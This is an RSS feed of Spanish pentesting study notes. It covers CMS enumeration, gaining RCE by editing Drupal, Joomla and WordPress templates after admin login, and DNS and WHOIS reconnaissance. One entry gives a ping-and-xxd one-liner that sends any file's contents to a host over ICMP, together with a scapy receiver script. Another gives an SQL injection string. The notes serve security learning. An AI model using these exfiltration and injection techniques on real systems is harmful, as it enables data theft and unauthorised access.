<br><br><br>Esto tambien es un CMS, es decir, es un sistema de gestion de contenidos (CMS) que permite desarrollar sitios web dínamicos. <br><br>En este caso podemos hacer uso de una herramienta llamada <a href="https://dobliuw.com?query=tag:droopescan" class="tag" target="_blank" rel="noopener nofollow">#droopescan</a>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/drupal/enumeración-de-drupal.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Drupal/Enumeración de Drupal.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:41 GMT</pubDate></item><item><title><![CDATA[Ganar acceso con Drupal comprometido]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:recon" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#recon</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:recon" class="tag" target="_blank" rel="noopener nofollow">#recon</a> 
<br><br><br>Una vez tengamos acceso como administrador a un gestor de contenido drupal, podríamos dirigirnos al apartado de content &gt; add content &gt; create article e inyectar código php en el Body, indicando que queremos hacer uso de php code.<br><img alt="rce_with_drupal.png" src="https://dobliuw.com/lib/media/rce_with_drupal.png"><br>
En caso de no tener la posibilidad de seleccionar php code, al estar como administrador podríamos modificar la página para que permita la subida de código php, dirigiendonos al apartado modules &gt; PHP filter. <br><img alt="add_php_to_drupal.png" src="https://dobliuw.com/lib/media/add_php_to_drupal.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/drupal/ganar-acceso-con-drupal-comprometido.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Drupal/Ganar acceso con Drupal comprometido.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:42 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/rce_with_drupal.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/rce_with_drupal.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Joomla]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:cms" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#cms</a> <a class="tag" href="https://dobliuw.com/?query=tag:gestoresdecontenido" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#gestoresdecontenido</a> <a class="tag" href="https://dobliuw.com/?query=tag:wordpress" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#wordpress</a> <a class="tag" href="https://dobliuw.com/?query=tag:joomscan" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#joomscan</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:cms" class="tag" target="_blank" rel="noopener nofollow">#cms</a> <a href="https://dobliuw.com?query=tag:gestoresdecontenido" class="tag" target="_blank" rel="noopener nofollow">#gestoresdecontenido</a>
<br><br><br>Al igual que <a href="https://dobliuw.com?query=tag:wordpress" class="tag" target="_blank" rel="noopener nofollow">#wordpress</a> joomla es un sistema de gestion de contenidos (CMS) que permite desarrollar sitios web dínamicos. <br><br>Haciendo uso de una herramienta llamada <a href="https://dobliuw.com?query=tag:joomscan" class="tag" target="_blank" rel="noopener nofollow">#joomscan</a> podriamos enumerar el CMS joomla <a rel="noopener nofollow" class="external-link" href="https://github.com/OWASP/joomscan" target="_blank">https://github.com/OWASP/joomscan</a><br><br><br>Una vez dentro de un Joomla en el panel administrativo podríamos modificar los templates para modificar un archivo php. De esta manera podríamos modificar el template de error.php para que a la hora de dirigirnos a una ruta como /joomla/index.php/&lt;&gt; generemos el error esperado de manera que se ejecute el código indicado en el template del archivo error.php. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/joomla/joomla.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Joomla/Joomla.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:42 GMT</pubDate></item><item><title><![CDATA[RCE tras login en Joomla con cuenta admin]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:cms" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#cms</a> <a class="tag" href="https://dobliuw.com/?query=tag:gestoresdecontenido" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#gestoresdecontenido</a> <a class="tag" href="https://dobliuw.com/?query=tag:rce" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#rce</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:cms" class="tag" target="_blank" rel="noopener nofollow">#cms</a> <a href="https://dobliuw.com?query=tag:gestoresdecontenido" class="tag" target="_blank" rel="noopener nofollow">#gestoresdecontenido</a> <a href="https://dobliuw.com?query=tag:rce" class="tag" target="_blank" rel="noopener nofollow">#rce</a> 
<br><br><br>Una vez que obtengamos acceso a una cuenta con permisos administrativos en Joomla, mediante múltiples técnicas como puede ser la explotación de una vulnerabilidad, password guessing, brute force, etc, muy probablemente podramos deribar este simple acto de login en un <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br>Para llevar a cabo esto, nos dirigiriamos a la sección de edición de Extensions/Templates/Templates, en donde podríamos inyectar código php en el mismo para abusar de este.<br>Primero nos dirigiriamos a la sección mencionada previamente...<br>
<img alt="edit_templates_rce_joomla.png" src="https://dobliuw.com/lib/media/edit_templates_rce_joomla.png"><br>Una vez en dicha sección, procederemos a seleccionar un template para editar...<br>
<img alt="select_template_rce_joomla.png" src="https://dobliuw.com/lib/media/select_template_rce_joomla.png"><br>Una vez seleccionado un template, podremos notar que nos encontraremos con varios archivos .php, por ejemplo error.php, archivo php que aparecerá tras ocacionar un error en la página, al igual que realizar <a data-href="RCE tras acceso a Wordpress con cuenta admin" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/wordpress/rce-tras-acceso-a-wordpress-con-cuenta-admin.html" class="internal-link" target="_self" rel="noopener nofollow">RCE tras acceso a Wordpress con cuenta admin</a>, la idea es modificar el código php para llevara  cabo cualquier ejecución de comandos que deseemos.<br><img alt="inject_code_rce_joomla.png" src="https://dobliuw.com/lib/media/inject_code_rce_joomla.png"><br>Y solo quedaría ocacionar el error para poder obtener la ejecución del código deseado:<br><img alt="rce_joomla.png" src="https://dobliuw.com/lib/media/rce_joomla.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/joomla/rce-tras-acceso-a-joomla-con-cuenta-admin.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Joomla/RCE tras acceso a Joomla con cuenta admin.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 13 Mar 2024 01:56:44 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/edit_templates_rce_joomla.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/edit_templates_rce_joomla.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Enumeración de Wordpress]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:cms" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#cms</a> <a class="tag" href="https://dobliuw.com/?query=tag:gestoresdecontenido" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#gestoresdecontenido</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:cms" class="tag" target="_blank" rel="noopener nofollow">#cms</a> <a href="https://dobliuw.com?query=tag:gestoresdecontenido" class="tag" target="_blank" rel="noopener nofollow">#gestoresdecontenido</a>
<br><br><br>Wordpress es un sistema de gestion de contenido enfocado a la creación de cualquier página web, por lo que es muy comun encontrarselo en auditorias, en este caso, hay que tener en cuenta multiples factores que podrian perjudicar a un wordpress dandole ventaja al atacante. <br><br>Existen multiples maneras de enumerar un wordpress, esto tambien depende mucho de la versión de wordpress a la que nos enfrentemos, muchas veces, las publicaciones en esta página suele estar acompañada del nombre, en el cual si tocamos, nos dirige a una página con el sig formato /?author=1, en donde dice 1, podriamos intentar cambiar el número para intentar enumerar usuarios, asi como tambien, muchas veces, en el login, al logearte con un usuario correcto el mismo te comenta que la contraseña no es valida para el usuario, en cambio, cuando usamos un usuario inexistente nos comenta que el mismo no existe, teniendo asi una via potencial de confirmar la existencia de los usuarios.<br>
A si mismo, muchas veces el wordpress no esta desactualizado, pero el mismo cuenta con infinidad de plugins los cuales si podrian estar vulnerables, existe una dirección la cual es "/wp-content" las cuales aveces puede llegar a listar plugins, lo mismo en el codigo fuente   curl -s -X GET url | grep -oP "plugins/\K[^/]+" | sort -u<br>
En cuanto a  enumeración de usuarios, tambien algo que podriamos probar es verificar si el recurso /xmlrpc.php esta expuesto. En caso de que si,  ya sea de manera manual o con wpscan podriamos intentar realizar un ataque de fuerza bruta para saber la contraseña del usuario. <br><br>A la hora de hablar de enumeración de Wordpress es imposible no mencionar el uso de wpscan, siendo esta una herramienta de scaneo enfocada unicamente a wordpress, la cual es muy sensilla de usar. <br>wpscan --url {target_url} -e vp,u --api-token="{api_token_confirated}"
# En este caso estamod con el parametro -e (enumerate), pidiendo que se enumeren vp (vulnerable plugins) y u (users), para que esto funcione necesitamos un api token que lo podemos obtener logeandonos aca https://wpscan.com/api
Copy<br>U obviamente haciendo uso de un script propio de bash.<br><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/wordpress/enumeración-de-wordpress.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Wordpress/Enumeración de Wordpress.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 29 Feb 2024 01:00:40 GMT</pubDate></item><item><title><![CDATA[RCE tras login en Wordpress con cuenta admin]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:cms" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#cms</a> <a class="tag" href="https://dobliuw.com/?query=tag:gestoresdecontenido" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#gestoresdecontenido</a> <a class="tag" href="https://dobliuw.com/?query=tag:rce" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#rce</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:cms" class="tag" target="_blank" rel="noopener nofollow">#cms</a> <a href="https://dobliuw.com?query=tag:gestoresdecontenido" class="tag" target="_blank" rel="noopener nofollow">#gestoresdecontenido</a> <a href="https://dobliuw.com?query=tag:rce" class="tag" target="_blank" rel="noopener nofollow">#rce</a> 
<br><br><br>Una vez que obtengamos acceso a una cuenta con permisos administrativos en Wordpress, mediante múltiples técnicas como puede ser la explotación de una vulnerabilidad, password guessing, brute force, etc, muy probablemente podramos deribar este simple acto de login en un <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>. <br>Para llevar a cabo esto, nos dirigiriamos a la sección de edición de themes, en donde podríamos inyectar código php en el mismo para abusar de este.<br>Ejemplo:<br>
<br>Si nos dirigimos a la url target pero la ruta /wp-admin/theme-editor.php?file=404.php&amp;theme=twentyfifteen&amp;scrollto=73 para realizar una edición en el theme de la plantilla que se aparece tras ingresar una url dentro del Wordpress que no se logra encontrar.
<br>Una vez en esta URL, simlemente modificariamos el contenido php de la misma ingresando las líneas que nos interesen, por ejemplo:
<br><img alt="RCE_Wordpress.png" src="https://dobliuw.com/lib/media/rce_wordpress.png"><br>
<br>Una vez hecho esto, solo quedaría conseguir el famoso Page not found (Siguiendo este ejemplo, ya que es el theme que se edita, en caso de ser otro habría que dirigirse a una sección de la página en donde se vea reflejado el theme editado):
<br><img alt="RCE_Wordpress_success.png" src="https://dobliuw.com/lib/media/rce_wordpress_success.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/wordpress/rce-tras-acceso-a-wordpress-con-cuenta-admin.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Wordpress/RCE tras acceso a Wordpress con cuenta admin.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Mar 2024 01:15:52 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/rce_wordpress.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/rce_wordpress.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Magento]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:cms" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#cms</a> <a class="tag" href="https://dobliuw.com/?query=tag:gestoresdecontenido" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#gestoresdecontenido</a> <a class="tag" href="https://dobliuw.com/?query=tag:magescan" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#magescan</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:cms" class="tag" target="_blank" rel="noopener nofollow">#cms</a> <a href="https://dobliuw.com?query=tag:gestoresdecontenido" class="tag" target="_blank" rel="noopener nofollow">#gestoresdecontenido</a> 
<br><br><br>Sin dudas otro CMS, una plataforma de comercio electrónico de código abierto. <br><br>La herramienta <a href="https://dobliuw.com?query=tag:magescan" class="tag" target="_blank" rel="noopener nofollow">#magescan</a> es una herramienta muy  poderosa para enumerar este CMS]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/magento.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Gestores De Contenido/Magento.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:42 GMT</pubDate></item><item><title><![CDATA[IIS - (Internet Information Service)]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:toeria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#toeria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:toeria" class="tag" target="_blank" rel="noopener nofollow">#toeria</a> 
<br><br><br>IIS son las iniciales de Internet Information Service y si bien es más conocido como servidor web en realidad son un conjunto de servicios que tranfomarn un sistema Microsoft Windows en un servidor capaz de ofrecer servicios Web, FTP y SMTP entre otros.<br><br><br>A la hora de enfrentarnos a un servidor IIS, puede resultar muy interesante la etapa de reconocimento con herramientas como ffuf, gobuster o wfuzz haciendo uso de extensiones asp, aspx, config y php.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/iis/iis-(internet-information-service).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/IIS/IIS - (Internet Information Service).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:20:04 GMT</pubDate></item><item><title><![CDATA[TCP (Transmission Control Protocol)]]></title><description><![CDATA[ 
 <br><br>
<br>
Orientado a la Conexión: TCP es un protocolo orientado a la conexión, lo que significa que establece una conexión segura y confiable entre el emisor y el receptor antes de la transmisión de datos.

<br>
Fiabilidad y Control de Flujo: Garantiza la entrega de datos sin errores y en el mismo orden en que se enviaron. También gestiona el control de flujo y la corrección de errores.

<br>
Uso en Aplicaciones: Es ampliamente utilizado en aplicaciones que requieren una entrega fiable de datos, como navegadores web, correo electrónico, y transferencia de archivos.

]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/0.-tcp.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/0. TCP.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:17:32 GMT</pubDate></item><item><title><![CDATA[Data exfiltration through ICMP]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>El protoclo de mansajes de control de internet o ICMP es parte del conjutno del protocolo IP. Es utilizado para enciar mensajes de error e información operatia. <br><br><br>Existe una técnica muy interesante para exfiltrar data haciendo uso de la herramienta ping y utilidades en python como el modulo scapy (pip3 install scapy), esto quiere decir que seríamos capaz de envíar el contenido de todo un archivo mediante traszas icmp para posteriormente hacinedo uso de scapy obtener su contenido.<br><br><br>La herramienta ping tiene un parametro el cual es -p que nos permite envíar un patrón personalizado que se envía en los paquetes de solicitud de ping. Mayormente se utiliza para verificar la integridad de los paquetes de respuesta recibidos. Cada vez qeu se envía un paquede de ping con un patrón personalizado, el sistema receptor debería devolver un paquete de respuesta que coincida con el patrón enviado. <br>Por lo que entendemos, este patrón puede ser personalizado, permitiendonos así envíar valores hexadecimales que querramos. <br>Por otro lado, la herramienta xxd nos permite pasar valores a hexadecimal, esta herramienta puede transformar a hexadecimal un archivo completo e incluso separarlo en partes, es decir, de 4 en 4, de 5 en 5, de 20 en 20, como querramos. <br>Si juntamos estos dos conceptos, la idea sería transformar un archivo en hexadecimal alternandolo en valores (Recomendado de 4 en 4) para recorrer cada par de estos 4 bytes y envíar una traza icmp con el patrón que corresponde a estos 4 bytes que íran alternando del archivo que se busca leer, para que de manera posterior con un script en python, haciendo uso de scapy poder transformar todas estas trazas a el contenido original del archivo. <br><br><br>
<br>


<br>Como vimos, lo primero sería leer todo el archivo para separarlo en pares de 4 bytes y posteriormente envíar trazas icmp con el valor de estos bytes como patrón. <br>xxd -p -c 4 {file_to_read} | while read line; do ping -c 1 -p $line {ip}; done 

for line in $(xxd -p -c 4 {file_to_read}); do ping -c 1 -p $line {ip}; done
Copy<br>De manera alterna, previo a realizar esto, deberíamos estar almacenando todas las trazas icmp envíadas en un archivo de captura. <br>sudo tcpdump -i {interfaz} icmp -n -v -w Captura.cap
Copy<br>De esta manera estaremos en escucha de todas las trazas icmp recibidas por una determinada interfaz y estaremos alojando todas estas en un archivo llamado Captura.cap <br>Una vez realizado esto ya tendríamos todas las trazas almacenadas listas para ser leidas y obtener la información de interez en el patrón de cada una de estas, para eso usarémos scapy. <br><br>
<br>


<br>Para leer un archivo con scapy podrémos hacer uso de la función rdpcap, posteriormente para ver cada paquete podríamos guardar el contenido arrojado de la función rdpcac en una variable la cual se convertirá en un array donde cada posición corresponde a un paquete. De esta manera pudiendo acceder a cada paquete, cada uno de estos contiene layers como Ether, IP, ICMP, etc. de manera que podríamos acceder a layers para acercarnos más a la información que nos interesa. Una vez que seleccionamos una layer podríamos listar con la función ls los atributos de las layers así como acceder a los atributos de las layers. <br>from scapy.all import *

packets = rdpcap("{path_file_.cap}")

# Acceder a distintos paquetes 
print(packets[0])

# Acceder a una layer de un paquete 
packets[0][ICMP]

# Listar los atributos de las layers
ls(packets[0][ICMP])

# Acceder a un atributo 
packets[0][ICMP].load
Copy<br>En la layer ICMP atributo load tendríamos los patrónes envíados a travez de cada una de las trazas icmp transmitidas. Ahora, es importante tener en cuenta que los paquetes van a estar repetidos como también puede ser que no contenga la layer ICMP, de manera que para poder listar los contenidos de manera correcta nos deberíamos asegurar de que los paquetes no se repitan, esto lo podríamos realizar con la función .type la cual devuelce 8 o 0 dependiendo de si es impar o par. Mientras que el asegurarnos de que el paquete tenga la layer ICMP lo podemos hacer con la función .haslayer. <br># ........

# Verificar el tipo del paquete, si es par o impar
packet[0].type

# Verificar si el primer paquete tiene una determinada layer
packet[0].haslayer(ICMP)
Copy<br>De esta manera podríamos utilizar toda esta información para realizar un script en python el cual se encargue de leer un archivo .cap y arrojarnos la información gracias a acceder a todos los patrónes de cada una de las trazas icmp alojadas en el archivo. <br>from scapy.all import * 
import signal, sys, readline, os

# Configuration 

readline.parse_and_bind("set editing-mode emacs")

# Ctrl + c

def ctrl_c(sig, frame):
    print("\n\n\t[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c) 

# Data exfiltration

def sniffTrafic(interface):
    print("\n[+] Your file content: \n")
    sniff(iface=interface, prn=readICMPpatterns)
    

def readICMPpatterns(packet): 
    
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        line = packet[ICMP].load[-4:].decode('utf-8')
        print(line, flush=True, end='')


if __name__ == "__main__": 
    
    if os.geteuid() == 0:
        interface = input("\n\t[!] Please insert the interface to listen: ")
        sniffTrafic(interface) 
    else: 
        print("\n\n\t[!] Please run the script as root ツ\n\n")

Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/data-exfiltration-through-icmp.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Data exfiltration through ICMP.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 04 Jun 2024 18:47:17 GMT</pubDate></item><item><title><![CDATA[Enum WHOIS 43]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:enumeration" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#enumeration</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:enumeration" class="tag" target="_blank" rel="noopener nofollow">#enumeration</a> 
<br><br><br><br><br>De primeras, si de cara a una auditoría nos encontramos con el puerto 43 abierto, lo que podríamos hacer es intentar realizar la enumeración correspondiente, de esta manera podríamos acceder a datos sensibles de diferentes usuarios que se encuentren registrados como operadores de los diversos dominios registrados en la base de datos.<br><br>Para enumerar la información asociada a un dominio podríamos ejecutar las siguientes consultas.<br>whois -h {host} -p {port} "{domain}"

echo "{domain}" | nc -vn {host} {port}
Copy<br>Es importante tener en cuenta que aveces cuando solicitamos esta información al servicio WHOIS, la base de datos que se está utilizanod aparece en la respuesta. <br><img alt="db_version_whois_response.png" src="https://dobliuw.com/lib/media/db_version_whois_response.png"><br>
Como sabemos, el servicio WHOIS necesita hacer uso de una base de datos para almacenar y extraer la información. Por lo que puede llegar a ser posible pensar en  <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a>. Por ejemplo, haciendo uso de la query "a' ) or 1=1#" podríamos llegar a extraer toda la información almacenada en la base de datos.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum-whois-43.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum WHOIS 43.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:33:51 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/db_version_whois_response.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/db_version_whois_response.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Enum. DNS 53 - (Domain Name System)]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>Como ya sabemos, el servicio DNS es un sistema de nomenclatura jerárquico descentralizado para dispositivos contectados a redes IP como internet o redes privadas. Este sistema asocia información variada con nombres de dominio asignados a cada uno de los participantes. <br><br><br>Cuando nos encontramos con el servicio Domain en una auditoría, este puede ser una gran fuente de información y un punto muy fuerte de interez en la fase de reconocimiento, ya que puede ayudarnos a obtener información relevante. <br>Lo primero que se nos ocurre a la hora de encontrar este servicio corriendo es realizar <a data-href="AXFR - Full Zone Transfe" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/axfr-full-zone-transfe.html" class="internal-link" target="_self" rel="noopener nofollow">AXFR - Full Zone Transfe</a> para intentar enumerar subdominios, servidores de correos, name servers. <br># Sintaxis 
dig {consulta} @{DNS-Server} {domain-name}

# Enumeración de servidores de correo 
dig mx @192.168.1.38 dobliuw.local
# Enumeración de name servers 
dig ns @192.168.1.38 dobliuw.local
# Transferencia de zona 
dig axfr @192.168.1.38 dobliuw.local
